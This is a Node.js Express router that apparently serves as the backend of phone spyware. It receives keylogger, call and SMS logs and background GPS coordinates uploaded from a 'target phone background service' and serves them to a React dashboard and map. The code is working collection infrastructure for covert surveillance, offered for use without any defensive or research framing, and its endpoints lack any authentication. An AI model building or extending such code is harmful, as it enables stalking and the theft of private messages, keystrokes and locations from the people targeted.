const express = require('express');
const router = express.Router();
const Log = require('../models/Log');
const Location = require('../models/Location');
const Screenshot = require('../models/Screenshot');
const AppPurchase = require('../models/AppPurchase');

// Bulk upload logs (calls, sms, keylogger, etc.) from target phone background service
router.post('/upload/logs', async (req, res) => {
  try {
    const { logs } = req.body; // Expects an array of log items
    if (!Array.isArray(logs)) {
      return res.status(400).json({ message: 'logs must be an array' });
    }
    const inserted = await Log.insertMany(logs);
    res.status(201).json({ count: inserted.length, message: 'Logs uploaded successfully' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Upload Location background GPS coordinates
router.post('/upload/location', async (req, res) => {
  try {
    const { latitude, longitude, address, timestamp } = req.body;
    const location = new Location({ latitude, longitude, address, timestamp });
    await location.save();
    res.status(201).json({ message: 'Location log uploaded successfully' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Fetch logs filtered by type (e.g. keylogger, call, sms) for React Dashboard
router.get('/data/logs', async (req, res) => {
  try {
    const { type } = req.query;
    const filter = type ? { type } : {};
    const logs = await Log.find(filter).sort({ timestamp: -1 }).limit(1000);
    res.json(logs);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Fetch Location log history for React Dashboard Map
router.get('/data/locations', async (req, res) => {
  try {
    const locations = await Location.find().sort({ timestamp: -1 }).limit(50);
    res.json(locations);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
